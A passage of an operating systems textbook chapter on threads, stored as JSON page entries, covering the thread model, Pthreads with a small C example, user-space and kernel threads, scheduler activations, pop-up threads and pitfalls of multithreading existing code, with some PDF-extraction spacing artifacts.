are used to group resources together; threads are the entities\r\nscheduled for execution on the CPU.\r\nWhat threads add to the process model is to allow multiple executions to take\r\nplace in the same process environment, to a large degree independent of one anoth\u0002er. Having multiple threads running in parallel in one process is analogous to hav\u0002ing multiple processes running in parallel in one computer. In the former case, the\r\nthreads share an address space and other resources. In the latter case, processes\r\nshare physical memory, disks, printers, and other resources. Because threads have\r\nsome of the properties of processes, they are sometimes called lightweight pro\u0002cesses. The term multithreading is also used to describe the situation of allowing\r\nmultiple threads in the same process. As we saw in Chap. 1, some CPUs have\r\ndirect hardware support for multithreading and allow thread switches to happen on\r\na nanosecond time scale.\r\nIn Fig. 2-11(a) we see three traditional processes. Each process has its own ad\u0002dress space and a single thread of control. In contrast, in Fig. 2-11(b) we see a sin\u0002gle process with three threads of control. Although in both cases we have three\r\nthreads, in Fig. 2-11(a) each of them operates in a different address space, whereas\r\nin Fig. 2-11(b) all three of them share the same address space.\r\nWhen a multithreaded process is run on a single-CPU system, the threads take\r\nturns running. In Fig. 2-1, we saw how multiprogramming of processes works. By\r\nswitching back and forth among multiple processes, the system gives the illusion\r\nof separate sequential processes running in parallel. Multithreading works the same\r\nway. The CPU switches rapidly back and forth among the threads, providing the\r\nillusion that the threads are running in parallel, albeit on a slower CPU than the\r\nreal one. With three compute-bound threads in a process, the threads would appear\r\nto be running in parallel, each one on a CPU with one-third the speed of the real\r\nCPU.\r\nDifferent threads in a process are not as independent as different processes. All\r\nthreads have exactly the same address space, which means that they also share the\n104 PROCESSES AND THREADS CHAP. 2\r\nThread Thread\r\nKernel Kernel\r\nProcess 1 Process 2 Process 3 Process\r\nUser\r\nspace\r\nKernel\r\nspace\r\n(a) (b)\r\nFigure 2-11. (a) Three processes each with one thread. (b) One process with\r\nthree threads.\r\nsame global variables. Since every thread can access every memory address within\r\nthe process’ address space, one thread can read, write, or even wipe out another\r\nthread’s stack. There is no protection between threads because (1) it is impossible,\r\nand (2) it should not be necessary. Unlike different processes, which may be from\r\ndifferent users and which may be hostile to one another, a process is always owned\r\nby a single user, who has presumably created multiple threads so that they can\r\ncooperate, not fight. In addition to sharing an address space, all the threads can\r\nshare the same set of open files, child processes, alarms, and signals, an so on, as\r\nshown in Fig. 2-12. Thus, the organization of Fig. 2-11(a) would be used when the\r\nthree processes are essentially unrelated, whereas Fig. 2-11(b) would be ap\u0002propriate when the three threads are actually part of the same job and are actively\r\nand closely cooperating with each other.\r\nPer-process items Per-thread items\r\nAddress space Program counter\r\nGlobal var iables Registers\r\nOpen files Stack\r\nChild processes State\r\nPending alarms\r\nSignals and signal handlers\r\nAccounting infor mation\r\nFigure 2-12. The first column lists some items shared by all threads in a process.\r\nThe second one lists some items private to each thread.\r\nThe items in the first column are process properties, not thread properties. For\r\nexample, if one thread opens a file, that file is visible to the other threads in the\r\nprocess and they can read and write it. This is logical, since the process is the unit\nSEC. 2.2 THREADS 105\r\nof resource management, not the thread. If each thread had its own address space,\r\nopen files, pending alarms, and so on, it would be a separate process. What we are\r\ntrying to achieve with the thread concept is the ability for multiple threads of ex\u0002ecution to share a set of resources so that they can work together closely to per\u0002form some task.\r\nLike a traditional process (i.e., a process with only one thread), a thread can be\r\nin any one of several states: running, blocked, ready, or terminated. A running\r\nthread currently has the CPU and is active. In contrast, a blocked thread is waiting\r\nfor some event to unblock it. For example, when a thread performs a system call to\r\nread from the keyboard, it is blocked until input is typed. A thread can block wait\u0002ing for some external event to happen or for some other thread to unblock it. A\r\nready thread is scheduled to run and will as soon as its turn comes up. The tran\u0002sitions between thread states are the same as those between process states and are\r\nillustrated in Fig. 2-2.\r\nIt is important to realize that each thread has its own stack, as illustrated in\r\nFig. 2-13. Each thread’s stack contains one frame for each procedure called but\r\nnot yet returned from. This frame contains the procedure’s local variables and the\r\nreturn address to use when the procedure call has finished. For example, if proce\u0002dure X calls procedure Y and Y calls procedure Z, then while Z is executing, the\r\nframes for X, Y, and Z will all be on the stack. Each thread will generally call dif\u0002ferent procedures and thus have a different execution history. This is why each\r\nthread needs its own stack.\r\n Kernel \r\nThread 3's stack\r\nProcess\r\nThread 3 Thread 1\r\nThread 2\r\nThread 1's\r\nstack\r\nFigure 2-13. Each thread has its own stack.\r\nWhen multithreading is present, processes usually start with a single thread\r\npresent. This thread has the ability to create new threads by calling a library proce\u0002dure such as thread create. A parameter to thread create specifies the name of a\r\nprocedure for the new thread to run. It is not necessary (or even possible) to speci\u0002fy anything about the new thread’s address space, since it automatically runs in the\n106 PROCESSES AND THREADS CHAP. 2\r\naddress space of the creating thread. Sometimes threads are hierarchical, with a\r\nparent-child relationship, but often no such relationship exists, with all threads\r\nbeing equal. With or without a hierarchical relationship, the creating thread is\r\nusually returned a thread identifier that names the new thread.\r\nWhen a thread has finished its work, it can exit by calling a library procedure,\r\nsay, thread exit. It then vanishes and is no longer schedulable. In some thread\r\nsystems, one thread can wait for a (specific) thread to exit by calling a procedure,\r\nfor example, thread join. This procedure blocks the calling thread until a (specif\u0002ic) thread has exited. In this regard, thread creation and termination is very much\r\nlike process creation and termination, with approximately the same options as well.\r\nAnother common thread call is thread yield, which allows a thread to volun\u0002tarily give up the CPU to let another thread run. Such a call is important because\r\nthere is no clock interrupt to actually enforce multiprogramming as there is with\r\nprocesses. Thus it is important for threads to be polite and voluntarily surrender the\r\nCPU from time to time to give other threads a chance to run. Other calls allow one\r\nthread to wait for another thread to finish some work, for a thread to announce that\r\nit has finished some work, and so on.\r\nWhile threads are often useful, they also introduce a number of complications\r\ninto the programming model. To start with, consider the effects of the UNIX fork\r\nsystem call. If the parent process has multiple threads, should the child also have\r\nthem? If not, the process may not function properly, since all of them may be es\u0002sential.\r\nHowever, if the child process gets as many threads as the parent, what happens\r\nif a thread in the parent was blocked on a read call, say, from the keyboard? Are\r\ntwo threads now blocked on the keyboard, one in the parent and one in the child?\r\nWhen a line is typed, do both threads get a copy of it? Only the parent? Only the\r\nchild? The same problem exists with open network connections.\r\nAnother class of problems is related to the fact that threads share many data\r\nstructures. What happens if one thread closes a file while another one is still read\u0002ing from it? Suppose one thread notices that there is too little memory and starts\r\nallocating more memory. Partway through, a thread switch occurs, and the new\r\nthread also notices that there is too little memory and also starts allocating more\r\nmemory. Memory will probably be allocated twice. These problems can be solved\r\nwith some effort, but careful thought and design are needed to make multithreaded\r\nprograms work correctly."
          },
          "2.2.3 POSIX Threads": {
            "page": 137,
            "content": "2.2.3 POSIX Threads\r\nTo make it possible to write portable threaded programs, IEEE has defined a\r\nstandard for threads in IEEE standard 1003.1c. The threads package it defines is\r\ncalled Pthreads. Most UNIX systems support it. The standard defines over 60\r\nfunction calls, which is far too many to go over here. Instead, we will just describe\nSEC. 2.2 THREADS 107\r\na few of the major ones to give an idea of how it works. The calls we will describe\r\nbelow are listed in Fig. 2-14.\r\nThread call Description\r\nPthread create Create a new thread\r\nPthread exit Ter minate the calling thread\r\nPthread join Wait for a specific thread to exit\r\nPthread yield Release the CPU to let another thread run\r\nPthread attr init Create and initialize a thread’s attr ibute structure\r\nPthread attr destroy Remove a thread’s attr ibute structure\r\nFigure 2-14. Some of the Pthreads function calls.\r\nAll Pthreads threads have certain properties. Each one has an identifier, a set of\r\nregisters (including the program counter), and a set of attributes, which are stored\r\nin a structure. The attributes include the stack size, scheduling parameters, and\r\nother items needed to use the thread.\r\nA new thread is created using the pthread create call. The thread identifier of\r\nthe newly created thread is returned as the function value. This call is intentionally\r\nvery much like the fork system call (except with parameters), with the thread iden\u0002tifier playing the role of the PID, mostly for identifying threads referenced in other\r\ncalls.\r\nWhen a thread has finished the work it has been assigned, it can terminate by\r\ncalling pthread exit. This call stops the thread and releases its stack.\r\nOften a thread needs to wait for another thread to finish its work and exit be\u0002fore continuing. The thread that is waiting calls pthread join to wait for a specific\r\nother thread to terminate. The thread identifier of the thread to wait for is given as\r\na parameter.\r\nSometimes it happens that a thread is not logically blocked, but feels that it has\r\nrun long enough and wants to give another thread a chance to run. It can accom\u0002plish this goal by calling pthread yield. There is no such call for processes be\u0002cause the assumption there is that processes are fiercely competitive and each\r\nwants all the CPU time it can get. However, since the threads of a process are\r\nworking together and their code is invariably written by the same programmer,\r\nsometimes the programmer wants them to give each other another chance.\r\nThe next two thread calls deal with attributes. Pthread attr init creates the\r\nattribute structure associated with a thread and initializes it to the default values.\r\nThese values (such as the priority) can be changed by manipulating fields in the\r\nattribute structure.\r\nFinally, pthread attr destroy removes a thread’s attribute structure, freeing up\r\nits memory. It does not affect threads using it; they continue to exist.\r\nTo get a better feel for how Pthreads works, consider the simple example of\r\nFig. 2-15. Here the main program loops NUMBER OF THREADS times, creating\n108 PROCESSES AND THREADS CHAP. 2\r\na new thread on each iteration, after announcing its intention. If the thread creation\r\nfails, it prints an error message and then exits. After creating all the threads, the\r\nmain program exits.\r\n#include <pthread.h>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#define NUMBER OF THREADS 10\r\nvoid *pr int hello world(void *tid)\r\n{\r\n/\r\n* This function prints the thread’s identifier and then exits. */\r\npr intf(\"Hello World. Greetings from thread %d\\n\", tid);\r\npthread exit(NULL);\r\n}\r\nint main(int argc, char *argv[])\r\n{\r\n/\r\n* The main program creates 10 threads and then exits. */\r\npthread t threads[NUMBER OF THREADS];\r\nint status, i;\r\nfor(i=0; i < NUMBER OF THREADS; i++) {\r\npr intf(\"Main here. Creating thread %d\\n\", i);\r\nstatus = pthread create(&threads[i], NULL, print hello world, (void *)i);\r\nif (status != 0) {\r\npr intf(\"Oops. pthread create returned error code %d\\n\", status);\r\nexit(-1);\r\n}\r\n}\r\nexit(NULL);\r\n}\r\nFigure 2-15. An example program using threads.\r\nWhen a thread is created, it prints a one-line message announcing itself, then it\r\nexits. The order in which the various messages are interleaved is nondeterminate\r\nand may vary on consecutive runs of the program.\r\nThe Pthreads calls described above are not the only ones. We will examine\r\nsome of the others after we have discussed process and thread synchronization."
          },
          "2.2.4 Implementing Threads in User Space": {
            "page": 139,
            "content": "2.2.4 Implementing Threads in User Space\r\nThere are two main places to implement threads: user space and the kernel.\r\nThe choice is a bit controversial, and a hybrid implementation is also possible. We\r\nwill now describe these methods, along with their advantages and disadvantages.\nSEC. 2.2 THREADS 109\r\nThe first method is to put the threads package entirely in user space. The ker\u0002nel knows nothing about them. As far as the kernel is concerned, it is managing\r\nordinary, single-threaded processes. The first, and most obvious, advantage is that\r\na user-level threads package can be implemented on an operating system that does\r\nnot support threads. All operating systems used to fall into this category, and even\r\nnow some still do. With this approach, threads are implemented by a library.\r\nAll of these implementations have the same general structure, illustrated in\r\nFig. 2-16(a). The threads run on top of a run-time system, which is a collection of\r\nprocedures that manage threads. We hav e seen four of these already: pthread cre\u0002ate, pthread exit, pthread join, and pthread yield, but usually there are more.\r\nProcess Thread Process Thread\r\nProcess\r\ntable\r\nProcess\r\ntable\r\nThread\r\ntable\r\nThread\r\ntable\r\nRun-time\r\nsystem\r\nKernel\r\nspace\r\nUser\r\nspace\r\nKernel Kernel\r\nFigure 2-16. (a) A user-level threads package. (b) A threads package managed\r\nby the kernel.\r\nWhen threads are managed in user space, each process needs its own private\r\nthread table to keep track of the threads in that process. This table is analogous to\r\nthe kernel’s process table, except that it keeps track only of the per-thread proper\u0002ties, such as each thread’s program counter, stack pointer, registers, state, and so\r\nforth. The thread table is managed by the run-time system. When a thread is\r\nmoved to ready state or blocked state, the information needed to restart it is stored\r\nin the thread table, exactly the same way as the kernel stores information about\r\nprocesses in the process table.\r\nWhen a thread does something that may cause it to become blocked locally, for\r\nexample, waiting for another thread in its process to complete some work, it calls a\r\nrun-time system procedure. This procedure checks to see if the thread must be put\r\ninto blocked state. If so, it stores the thread’s registers (i.e., its own) in the thread\r\ntable, looks in the table for a ready thread to run, and reloads the machine registers\r\nwith the new thread’s sav ed values. As soon as the stack pointer and program\r\ncounter have been switched, the new thread comes to life again automatically. If\n110 PROCESSES AND THREADS CHAP. 2\r\nthe machine happens to have an instruction to store all the registers and another\r\none to load them all, the entire thread switch can be done in just a handful of in\u0002structions. Doing thread switching like this is at least an order of magnitude—\r\nmaybe more—faster than trapping to the kernel and is a strong argument in favor\r\nof user-level threads packages.\r\nHowever, there is one key difference with processes. When a thread is finished\r\nrunning for the moment, for example, when it calls thread yield, the code of\r\nthread yield can save the thread’s information in the thread table itself. Fur\u0002thermore, it can then call the thread scheduler to pick another thread to run. The\r\nprocedure that saves the thread’s state and the scheduler are just local procedures,\r\nso invoking them is much more efficient than making a kernel call. Among other\r\nissues, no trap is needed, no context switch is needed, the memory cache need not\r\nbe flushed, and so on. This makes thread scheduling very fast.\r\nUser-level threads also have other advantages. They allow each process to have\r\nits own customized scheduling algorithm. For some applications, for example,\r\nthose with a garbage-collector thread, not having to worry about a thread being\r\nstopped at an inconvenient moment is a plus. They also scale better, since kernel\r\nthreads invariably require some table space and stack space in the kernel, which\r\ncan be a problem if there are a very large number of threads.\r\nDespite their better performance, user-level threads packages have some major\r\nproblems. First among these is the problem of how blocking system calls are im\u0002plemented. Suppose that a thread reads from the keyboard before any keys hav e\r\nbeen hit. Letting the thread actually make the system call is unacceptable, since\r\nthis will stop all the threads. One of the main goals of having threads in the first\r\nplace was to allow each one to use blocking calls, but to prevent one blocked\r\nthread from affecting the others. With blocking system calls, it is hard to see how\r\nthis goal can be achieved readily.\r\nThe system calls could all be changed to be nonblocking (e.g., a read on the\r\nkeyboard would just return 0 bytes if no characters were already buffered), but re\u0002quiring changes to the operating system is unattractive. Besides, one argument for\r\nuser-level threads was precisely that they could run with existing operating sys\u0002tems. In addition, changing the semantics of read will require changes to many\r\nuser programs.\r\nAnother alternative is available in the event that it is possible to tell in advance\r\nif a call will block. In most versions of UNIX, a system call, select, exists, which\r\nallows the caller to tell whether a prospective read will block. When this call is\r\npresent, the library procedure read can be replaced with a new one that first does a\r\nselect call and then does the read call only if it is safe (i.e., will not block). If the\r\nread call will block, the call is not made. Instead, another thread is run. The next\r\ntime the run-time system gets control, it can check again to see if the read is now\r\nsafe. This approach requires rewriting parts of the system call library, and is inef\u0002ficient and inelegant, but there is little choice. The code placed around the system\r\ncall to do the checking is called a jacket or wrapper.\nSEC. 2.2 THREADS 111\r\nSomewhat analogous to the problem of blocking system calls is the problem of\r\npage faults. We will study these in Chap. 3. For the moment, suffice it to say that\r\ncomputers can be set up in such a way that not all of the program is in main memo\u0002ry at once. If the program calls or jumps to an instruction that is not in memory, a\r\npage fault occurs and the operating system will go and get the missing instruction\r\n(and its neighbors) from disk. This is called a page fault. The process is blocked\r\nwhile the necessary instruction is being located and read in. If a thread causes a\r\npage fault, the kernel, unaware of even the existence of threads, naturally blocks\r\nthe entire process until the disk I/O is complete, even though other threads might\r\nbe runnable.01\r\nAnother problem with user-level thread packages is that if a thread starts run\u0002ning, no other thread in that process will ever run unless the first thread voluntarily\r\ngives up the CPU. Within a single process, there are no clock interrupts, making it\r\nimpossible to schedule processes round-robin fashion (taking turns). Unless a\r\nthread enters the run-time system of its own free will, the scheduler will never get a\r\nchance.\r\nOne possible solution to the problem of threads running forever is to hav e the\r\nrun-time system request a clock signal (interrupt) once a second to give it control,\r\nbut this, too, is crude and messy to program. Periodic clock interrupts at a higher\r\nfrequency are not always possible, and even if they are, the total overhead may be\r\nsubstantial. Furthermore, a thread might also need a clock interrupt, interfering\r\nwith the run-time system’s use of the clock.\r\nAnother, and really the most devastating, argument against user-level threads is\r\nthat programmers generally want threads precisely in applications where the\r\nthreads block often, as, for example, in a multithreaded Web server. These threads\r\nare constantly making system calls. Once a trap has occurred to the kernel to carry\r\nout the system call, it is hardly any more work for the kernel to switch threads if\r\nthe old one has blocked, and having the kernel do this eliminates the need for con\u0002stantly making select system calls that check to see if read system calls are safe.\r\nFor applications that are essentially entirely CPU bound and rarely block, what is\r\nthe point of having threads at all? No one would seriously propose computing the\r\nfirst n prime numbers or playing chess using threads because there is nothing to be\r\ngained by doing it that way."
          },
          "2.2.5 Implementing Threads in the Kernel": {
            "page": 142,
            "content": "2.2.5 Implementing Threads in the Kernel\r\nNow let us consider having the kernel know about and manage the threads. No\r\nrun-time system is needed in each, as shown in Fig. 2-16(b). Also, there is no\r\nthread table in each process. Instead, the kernel has a thread table that keeps track\r\nof all the threads in the system. When a thread wants to create a new thread or\r\ndestroy an existing thread, it makes a kernel call, which then does the creation or\r\ndestruction by updating the kernel thread table.\n112 PROCESSES AND THREADS CHAP. 2\r\nThe kernel’s thread table holds each thread’s registers, state, and other infor\u0002mation. The information is the same as with user-level threads, but now kept in the\r\nkernel instead of in user space (inside the run-time system). This information is a\r\nsubset of the information that traditional kernels maintain about their single\u0002threaded processes, that is, the process state. In addition, the kernel also maintains\r\nthe traditional process table to keep track of processes.\r\nAll calls that might block a thread are implemented as system calls, at consid\u0002erably greater cost than a call to a run-time system procedure. When a thread\r\nblocks, the kernel, at its option, can run either another thread from the same proc\u0002ess (if one is ready) or a thread from a different process. With user-level threads,\r\nthe run-time system keeps running threads from its own process until the kernel\r\ntakes the CPU away from it (or there are no ready threads left to run).\r\nDue to the relatively greater cost of creating and destroying threads in the ker\u0002nel, some systems take an environmentally correct approach and recycle their\r\nthreads. When a thread is destroyed, it is marked as not runnable, but its kernel\r\ndata structures are not otherwise affected. Later, when a new thread must be creat\u0002ed, an old thread is reactivated, saving some overhead. Thread recycling is also\r\npossible for user-level threads, but since the thread-management overhead is much\r\nsmaller, there is less incentive to do this.\r\nKernel threads do not require any new, nonblocking system calls. In addition,\r\nif one thread in a process causes a page fault, the kernel can easily check to see if\r\nthe process has any other runnable threads, and if so, run one of them while wait\u0002ing for the required page to be brought in from the disk. Their main disadvantage is\r\nthat the cost of a system call is substantial, so if thread operations (creation, termi\u0002nation, etc.) a common, much more overhead will be incurred.\r\nWhile kernel threads solve some problems, they do not solve all problems. For\r\nexample, what happens when a multithreaded process forks? Does the new proc\u0002ess have as many threads as the old one did, or does it have just one? In many\r\ncases, the best choice depends on what the process is planning to do next. If it is\r\ngoing to call exec to start a new program, probably one thread is the correct choice,\r\nbut if it continues to execute, reproducing all the threads is probably best.\r\nAnother issue is signals. Remember that signals are sent to processes, not to\r\nthreads, at least in the classical model. When a signal comes in, which thread\r\nshould handle it? Possibly threads could register their interest in certain signals, so\r\nwhen a signal came in it would be given to the thread that said it wants it. But what\r\nhappens if two or more threads register for the same signal? These are only two of\r\nthe problems threads introduce, and there are more."
          },
          "2.2.6 Hybrid Implementations": {
            "page": 143,
            "content": "2.2.6 Hybrid Implementations\r\nVarious ways have been investigated to try to combine the advantages of user\u0002level threads with kernel-level threads. One way is use kernel-level threads and\r\nthen multiplex user-level threads onto some or all of them, as shown in Fig. 2-17.\nSEC. 2.2 THREADS 113\r\nWhen this approach is used, the programmer can determine how many kernel\r\nthreads to use and how many user-level threads to multiplex on each one. This\r\nmodel gives the ultimate in flexibility.\r\nMultiple user threads\r\non a kernel thread\r\nUser\r\nspace\r\nKernel\r\nKernel thread space Kernel\r\nFigure 2-17. Multiplexing user-level threads onto kernel-level threads.\r\nWith this approach, the kernel is aware of only the kernel-level threads and\r\nschedules those. Some of those threads may have multiple user-level threads multi\u0002plexed on top of them. These user-level threads are created, destroyed, and sched\u0002uled just like user-level threads in a process that runs on an operating system with\u0002out multithreading capability. In this model, each kernel-level thread has some set\r\nof user-level threads that take turns using it."
          },
          "2.2.7 Scheduler Activations": {
            "page": 144,
            "content": "2.2.7 Scheduler Activations\r\nWhile kernel threads are better than user-level threads in some key ways, they\r\nare also indisputably slower. As a consequence, researchers have looked for ways\r\nto improve the situation without giving up their good properties. Below we will de\u0002scribe an approach devised by Anderson et al. (1992), called scheduler acti\u0002vations. Related work is discussed by Edler et al. (1988) and Scott et al. (1990).\r\nThe goals of the scheduler activation work are to mimic the functionality of\r\nkernel threads, but with the better performance and greater flexibility usually asso\u0002ciated with threads packages implemented in user space. In particular, user threads\r\nshould not have to make special nonblocking system calls or check in advance if it\r\nis safe to make certain system calls. Nevertheless, when a thread blocks on a sys\u0002tem call or on a page fault, it should be possible to run other threads within the\r\nsame process, if any are ready.\r\nEfficiency is achieved by avoiding unnecessary transitions between user and\r\nkernel space. If a thread blocks waiting for another thread to do something, for ex\u0002ample, there is no reason to involve the kernel, thus saving the overhead of the\n114 PROCESSES AND THREADS CHAP. 2\r\nkernel-user transition. The user-space run-time system can block the synchronizing\r\nthread and schedule a new one by itself.\r\nWhen scheduler activations are used, the kernel assigns a certain number of\r\nvirtual processors to each process and lets the (user-space) run-time system allo\u0002cate threads to processors. This mechanism can also be used on a multiprocessor\r\nwhere the virtual processors may be real CPUs. The number of virtual processors\r\nallocated to a process is initially one, but the process can ask for more and can also\r\nreturn processors it no longer needs. The kernel can also take back virtual proc\u0002essors already allocated in order to assign them to more needy processes.\r\nThe basic idea that makes this scheme work is that when the kernel knows that\r\na thread has blocked (e.g., by its having executed a blocking system call or caused\r\na page fault), the kernel notifies the process’ run-time system, passing as parame\u0002ters on the stack the number of the thread in question and a description of the event\r\nthat occurred. The notification happens by having the kernel activate the run-time\r\nsystem at a known starting address, roughly analogous to a signal in UNIX. This\r\nmechanism is called an upcall.\r\nOnce activated, the run-time system can reschedule its threads, typically by\r\nmarking the current thread as blocked and taking another thread from the ready\r\nlist, setting up its registers, and restarting it. Later, when the kernel learns that the\r\noriginal thread can run again (e.g., the pipe it was trying to read from now contains\r\ndata, or the page it faulted over has been brought in from disk), it makes another\r\nupcall to the run-time system to inform it. The run-time system can either restart\r\nthe blocked thread immediately or put it on the ready list to be run later.\r\nWhen a hardware interrupt occurs while a user thread is running, the inter\u0002rupted CPU switches into kernel mode. If the interrupt is caused by an event not of\r\ninterest to the interrupted process, such as completion of another process’ I/O,\r\nwhen the interrupt handler has finished, it puts the interrupted thread back in the\r\nstate it was in before the interrupt. If, however, the process is interested in the in\u0002terrupt, such as the arrival of a page needed by one of the process’ threads, the in\u0002terrupted thread is not restarted. Instead, it is suspended, and the run-time system is\r\nstarted on that virtual CPU, with the state of the interrupted thread on the stack. It\r\nis then up to the run-time system to decide which thread to schedule on that CPU:\r\nthe interrupted one, the newly ready one, or some third choice.\r\nAn objection to scheduler activations is the fundamental reliance on upcalls, a\r\nconcept that violates the structure inherent in any layered system. Normally, layer\r\nn offers certain services that layer n + 1 can call on, but layer n may not call proce\u0002dures in layer n + 1. Upcalls do not follow this fundamental principle."
          },
          "2.2.8 Pop-Up Threads": {
            "page": 145,
            "content": "2.2.8 Pop-Up Threads\r\nThreads are frequently useful in distributed systems. An important example is\r\nhow incoming messages, for example requests for service, are handled. The tradi\u0002tional approach is to have a process or thread that is blocked on a receive system\nSEC. 2.2 THREADS 115\r\ncall waiting for an incoming message. When a message arrives, it accepts the mes\u0002sage, unpacks it, examines the contents, and processes it.\r\nHowever, a completely different approach is also possible, in which the arrival\r\nof a message causes the system to create a new thread to handle the message. Such\r\na thread is called a pop-up thread and is illustrated in Fig. 2-18. A key advantage\r\nof pop-up threads is that since they are brand new, they do not have any his\u0002tory—registers, stack, whatever—that must be restored. Each one starts out fresh\r\nand each one is identical to all the others. This makes it possible to create such a\r\nthread quickly. The new thread is given the incoming message to process. The re\u0002sult of using pop-up threads is that the latency between message arrival and the\r\nstart of processing can be made very short.\r\nNetwork\r\nIncoming message\r\nPop-up thread\r\ncreated to handle\r\nincoming message Existing thread\r\nProcess\r\n(a) (b)\r\nFigure 2-18. Creation of a new thread when a message arrives. (a) Before the\r\nmessage arrives. (b) After the message arrives.\r\nSome advance planning is needed when pop-up threads are used. For example,\r\nin which process does the thread run? If the system supports threads running in the\r\nkernel’s context, the thread may run there (which is why we hav e not shown the\r\nkernel in Fig. 2-18). Having the pop-up thread run in kernel space is usually easier\r\nand faster than putting it in user space. Also, a pop-up thread in kernel space can\r\neasily access all the kernel’s tables and the I/O devices, which may be needed for\r\ninterrupt processing. On the other hand, a buggy kernel thread can do more dam\u0002age than a buggy user thread. For example, if it runs too long and there is no way\r\nto preempt it, incoming data may be permanently lost.\n116 PROCESSES AND THREADS CHAP. 2"
          },
          "2.2.9 Making Single-Threaded Code Multithreaded": {
            "page": 147,
            "content": "2.2.9 Making Single-Threaded Code Multithreaded\r\nMany existing programs were written for single-threaded processes. Convert\u0002ing these to multithreading is much trickier than it may at first appear. Below we\r\nwill examine just a few of the pitfalls.\r\nAs a start, the code of a thread normally consists of multiple procedures, just\r\nlike a process. These may have local variables, global variables, and parameters.\r\nLocal variables and parameters do not cause any trouble, but variables that are glo\u0002bal to a thread but not global to the entire program are a problem. These are vari\u0002ables that are global in the sense that many procedures within the thread use them\r\n(as they might use any global variable), but other threads should logically leave\r\nthem alone.\r\nAs an example, consider the errno variable maintained by UNIX. When a\r\nprocess (or a thread) makes a system call that fails, the error code is put into errno.\r\nIn Fig. 2-19, thread 1 executes the system call access to find out if it has permis\u0002sion to access a certain file. The operating system returns the answer in the global\r\nvariable errno. After control has returned to thread 1, but before it has a chance to\r\nread errno, the scheduler decides that thread 1 has had enough CPU time for the\r\nmoment and decides to switch to thread 2. Thread 2 executes an open call that\r\nfails, which causes errno to be overwritten and thread 1’s access code to be lost\r\nforever. When thread 1 starts up later, it will read the wrong value and behave\r\nincorrectly.\r\nThread 1 Thread 2\r\nAccess (errno set)\r\nErrno inspected\r\nOpen (errno overwritten)\r\nTime\r\nFigure 2-19. Conflicts between threads over the use of a global variable.\r\nVarious solutions to this problem are possible. One is to prohibit global vari\u0002ables altogether. Howev er worthy this ideal may be, it conflicts with much existing\r\nsoftware. Another is to assign each thread its own private global variables, as\r\nshown in Fig. 2-20. In this way, each thread has its own private copy of errno and\r\nother global variables, so conflicts are avoided. In effect, this decision creates a\nSEC. 2.2 THREADS 117\r\nnew scoping level, variables visible to all the procedures of a thread (but not to\r\nother threads), in addition to the existing scoping levels of variables visible only to\r\none procedure and variables visible everywhere in the program.\r\nThread 1's\r\ncode\r\nThread 2's\r\ncode\r\nThread 1's\r\nstack\r\nThread 2's\r\nstack\r\nThread 1's\r\nglobals\r\nThread 2's\r\nglobals\r\nFigure 2-20. Threads can have private global variables.\r\nAccessing the private global variables is a bit tricky, howev er, since most pro\u0002gramming languages have a way of expressing local variables and global variables,\r\nbut not intermediate forms. It is possible to allocate a chunk of memory for the\r\nglobals and pass it to each procedure in the thread as an extra parameter. While\r\nhardly an elegant solution, it works.\r\nAlternatively, new library procedures can be introduced to create, set, and read\r\nthese threadwide global variables. The first call might look like this:\r\ncreate global(\"bufptr\");\r\nIt allocates storage for a pointer called bufptr on the heap or in a special storage\r\narea reserved for the calling thread. No matter where the storage is allocated, only\r\nthe calling thread has access to the global variable. If another thread creates a glo\u0002bal variable with the same name, it gets a different storage location that does not\r\nconflict with the existing one.\r\nTw o calls are needed to access global variables: one for writing them and the\r\nother for reading them. For writing, something like\r\nset global(\"bufptr\", &buf);\r\nwill do. It stores the value of a pointer in the storage location previously created\r\nby the call to create global. To read a global variable, the call might look like\r\nbufptr = read global(\"bufptr\");\r\nIt returns the address stored in the global variable, so its data can be accessed.\n118 PROCESSES AND THREADS CHAP. 2\r\nThe next problem in turning a single-threaded program into a multithreaded\r\none is that many library procedures are not reentrant. That is, they were not de\u0002signed to have a second call made to any giv en procedure while a previous call has\r\nnot yet finished. For example, sending a message over the network may well be\r\nprogrammed to assemble the message in a fixed buffer within the library, then to\r\ntrap to the kernel to send it. What happens if one thread has assembled its message\r\nin the buffer, then a clock interrupt forces a switch to a second thread that im\u0002mediately overwrites the buffer with its own message?\r\nSimilarly, memory-allocation procedures such as malloc in UNIX, maintain\r\ncrucial tables about memory usage, for example, a linked list of available chunks\r\nof memory. While malloc is busy updating these lists, they may temporarily be in\r\nan inconsistent state, with pointers that point nowhere. If a thread switch occurs\r\nwhile the tables are inconsistent and a new call comes in from a different thread, an\r\ninvalid pointer may be used, leading to a program crash. Fixing all these problems\r\neffectively means rewriting the entire library. Doing so is a nontrivial activity with\r\na real possibility of introducing subtle errors.\r\nA different solution is to provide each procedure with a jacket that sets a bit to\r\nmark the library as in use. Any attempt for another thread to use a library proce\u0002dure while a previous call has not yet completed is blocked. Although this ap\u0002proach can be made to work, it greatly eliminates potential parallelism.\r\nNext, consider signals. Some signals are logically thread specific, whereas oth\u0002ers are not. For example, if a thread calls alar m, it makes sense for the resulting\r\nsignal to go to the thread that made the call. However, when threads are imple\u0002mented entirely in user space, the kernel does not even know about threads and can\r\nhardly direct the signal to the right one. An additional complication occurs if a\r\nprocess may only have one alarm pending at a time and several threads call alar m\r\nindependently.\r\nOther signals, such as keyboard interrupt, are not thread specific. Who should\r\ncatch them? One designated thread? All the threads? A newly created pop-up\r\nthread? Furthermore, what happens if one thread changes the signal handlers with\u0002out telling other threads? And what happens if one thread wants to catch a particu\u0002lar signal (say, the user hitting CTRL-C), and another thread wants this signal to\r\nterminate the process? This situation can arise if one or more threads run standard\r\nlibrary procedures and others are user-written. Clearly, these wishes are incompati\u0002ble. In general, signals are difficult enough to manage in a single-threaded envi\u0002ronment. Going to a multithreaded environment does not make them any easier to\r\nhandle.\r\nOne last problem introduced by threads is stack management. In many sys\u0002tems, when a process’ stack overflows, the kernel just provides that process with\r\nmore stack automatically. When a process has multiple threads, it must also have\r\nmultiple stacks. If the kernel is not aware of all these stacks, it cannot grow them\r\nautomatically upon stack fault. In fact, it may not even realize that a memory fault\r\nis related to the growth of some thread’s stack.\nSEC. 2.2 THREADS 119\r\nThese problems are certainly not insurmountable, but they do show that just\r\nintroducing threads into an existing system without a fairly substantial system\r\nredesign is not going to work at all. The semantics of system calls may have to be\r\nredefined and libraries rewritten, at the very least. And all of these things must be\r\ndone in such a way as to remain backward compatible with existing programs for\r\nthe limiting case of a process with only one thread. For additional information\r\nabout threads, see Hauser et al. (1993), Marsh et al. (1991), and Rodrigues et al.\r\n(2010)."
          }
        }
      },
